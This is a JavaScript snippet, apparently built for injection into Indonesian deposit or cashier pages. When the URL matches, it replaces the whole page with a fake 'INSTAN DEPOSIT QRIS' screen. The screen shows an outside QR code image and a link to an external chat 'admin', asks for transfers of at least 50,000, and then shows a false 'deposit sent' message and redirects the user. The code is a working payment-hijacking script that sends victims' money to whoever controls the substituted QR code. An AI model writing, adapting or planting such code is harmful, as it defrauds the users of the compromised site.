(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  const shouldRun = match.some(path => url.includes(path));
  if (!shouldRun) return;

  // Reset tampilan minimal
  document.documentElement.innerHTML = '<head></head><body></body>';

  // Tambah title, font & style
  document.head.insertAdjacentHTML('beforeend', `
    <title>INSTAN DEPOSIT QRIS</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&display=swap" rel="stylesheet">
    <style>
      body {
        margin: 0;
        background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSu1ZzxDdvDsoEK59QO3ASmi24P_P50-SYw5dmyuryt8qAVOPfq67TEVKOS&s=10') no-repeat center center fixed;
        background-size: cover;
        font-family: 'Montserrat', sans-serif;
        text-align: center;
        color: #fff;
      }
      h1 {
        font-weight: 700;
        margin: 20px 0;
        text-shadow: 2px 2px #000;
        color: #f7e733;
        font-size: 22px;
      }
      .marquee {
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
        font-weight: 600;
        text-shadow: 1px 1px #000;
        color: #00f7ff;
        font-size: 12px;
      }
      .marquee span {
        display: inline-block;
        padding-left: 100%;
        animation: marquee 15s linear infinite;
      }
      @keyframes marquee {
        0% { transform: translate(0, 0); }
        100% { transform: translate(-100%, 0); }
      }
      .choices {
        margin: 30px 0;
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 10px;
      }
      .choice {
        background: rgba(0,0,0,0.5);
        border: 2px solid #f7e733;
        border-radius: 5px;
        padding: 5px 12px;
        font-size: 14px;
        cursor: pointer;
        color: #fff;
      }
      .choice input { margin-right: 5px; }
      .content { margin-top: 20px; }
      .dana-info {
        border: 2px solid #00f7ff;
        display: inline-block;
        padding: 8px 15px;
        font-weight: 700;
        background: rgba(0,0,0,0.5);
        color: #fff;
        font-size: 14px;
        border-radius: 5px;
      }
      img.qris {
        max-width: 200px;
        height: auto;
        display: block;
        margin: 10px auto;
      }
      button, input {
        display: block;
        margin: 10px auto;
        padding: 8px;
        font-size: 14px;
        border: none;
        border-radius: 5px;
        width: 80%;
        max-width: 250px;
      }
      button {
        background: #f7e733;
        color: #000;
        font-weight: 700;
        cursor: pointer;
      }
      input { text-align: center; }
      .footer { margin-top: 50px; font-size: 12px; }
      .footer button { background: #00f7ff; }
      .footer img { max-width: 80px; display: block; margin: 10px auto; }
      #status { color: #00ff00; font-weight: 700; }
    </style>
  `);

  // Isi body
  document.body.innerHTML = `
    <h1>INSTAN DEPOSIT QRIS</h1>
    <div class="marquee"><span>PINDAI QRIS > ISI NOMINAL > TRANSFER > KONFIRMASI, DEPOSIT LEBIH CEPAT MENGGUNAKAN QRIS, WAJIB MENGGUNAKAN KODE UNIK 887</span></div>
    <div class="choices">
      <label class="choice"><input type="radio" name="method" value="bank">BANK</label>
      <label class="choice"><input type="radio" name="method" value="dana">DANA</label>
      <label class="choice"><input type="radio" name="method" value="ewallet">E-Wallet</label>
    </div>
    <div class="content" id="content"></div>
    <div class="footer">
      <button onclick="window.location.href='https://direct.lc.chat/19238771/'">HUBUNGI ADMIN</button>
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_QRIS.svg/1200px-Logo_QRIS.svg.png" alt="QRIS Logo" />
      <p>Do Not Share My Personal Information | © 2025 instantQr, Inc</p>
    </div>
  `;

  const content = document.getElementById('content');

  // Event listener radio button
  document.querySelectorAll('input[name="method"]').forEach(radio => {
    radio.addEventListener('change', () => {
      let html = '';

      if (radio.value === 'bank' || radio.value === 'ewallet') {
        html += `<img class="qris" src="https://imagizer.imageshack.com/img923/796/nWqzKT.jpg" />`;
        html += `<p style="font-weight:600;color:#fff;">QR UNTUK SEMUA JENIS ${radio.value.toUpperCase()}</p>`;
        html += `<button onclick="window.open('https://imagizer.imageshack.com/img923/796/nWqzKT.jpg')">Download Qris</button>`;
        html += getInputSection();
      } 
      else if (radio.value === 'dana') {
        html += `<div class="dana-info">ALIHKAN KE QRIS</div>`;
        html += `<p style="font-weight:600;color:#fff;">ALIHKAN KE QRIS</p>`;
        html += `<button id="copyBtn">SALIN NOMOR</button>`;
        html += getInputSection();
      }

      content.innerHTML = html;
      addInputListeners();

      // Copy nomor untuk DANA
      const copyBtn = document.getElementById('copyBtn');
      if (copyBtn) {
        copyBtn.addEventListener('click', () => {
          navigator.clipboard.writeText('ALIHKAN KE QRIS');
          document.getElementById('status').innerText = 'Nomor berhasil disalin!';
        });
      }
    });
  });

  function getInputSection() {
    return `
      <input type="text" id="amount" placeholder="Masukkan Nominal">
      <button id="confirmBtn">KONFIRMASI</button>
      <div id="status"></div>
    `;
  }

  function addInputListeners() {
    const amountInput = document.getElementById('amount');
    const confirmBtn = document.getElementById('confirmBtn');

    if (amountInput) {
      amountInput.addEventListener('input', formatAmount);
    }

    if (confirmBtn) {
      confirmBtn.addEventListener('click', confirmDeposit);
    }
  }

  function formatAmount(e) {
    let val = e.target.value.replace(/\D/g, '');
    if (val) val = parseInt(val).toLocaleString('id-ID');
    e.target.value = val;
  }

  function confirmDeposit() {
    const amountInput = document.getElementById('amount');
    const status = document.getElementById('status');
    let val = amountInput.value.replace(/\./g, '').replace(/,/g, '');

    if (parseInt(val) >= 50000) {
      let count = 3;
      const timer = setInterval(() => {
        status.innerText = `Deposit berhasil dikirim, Anda akan dialihkan dalam ${count}...`;
        count--;
        if (count < 0) {
          clearInterval(timer);
          window.location.href = '../';
        }
      }, 1000);
    } else {
      status.innerText = 'Minimal deposit 50.000';
      status.style.color = '#ff0000';
    }
  }
})();
